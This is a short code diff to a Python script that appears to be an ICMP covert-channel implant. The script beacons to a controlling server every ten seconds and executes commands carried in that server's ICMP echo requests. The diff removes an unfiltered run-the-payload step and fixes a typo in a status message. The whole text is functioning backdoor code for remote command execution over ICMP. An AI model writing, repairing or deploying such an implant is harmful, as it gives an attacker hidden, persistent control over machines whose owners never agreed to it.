@@ -22,9 +22,6 @@ def handle_incoming(pkt):
     # Look for ICMP Echo Requests FROM the server
     print("Received packet")
 
-    task = pkt[Raw].load.decode(errors="ignore")
-    run_task(task)
-
     if IP in pkt and ICMP in pkt:
         if pkt[IP].src == SERVER_IP and pkt[ICMP].type == 8:
             if pkt.haslayer(Raw) and pkt[IP].dst == get_local_ip(): # troubleshoot here if command exec stops working
@@ -64,5 +61,5 @@ if __name__ == "__main__":
 
     while True:
         send_beacon()
-        print("{+] Beacon sent")
+        print("[+] Beacon sent")
         time.sleep(10)
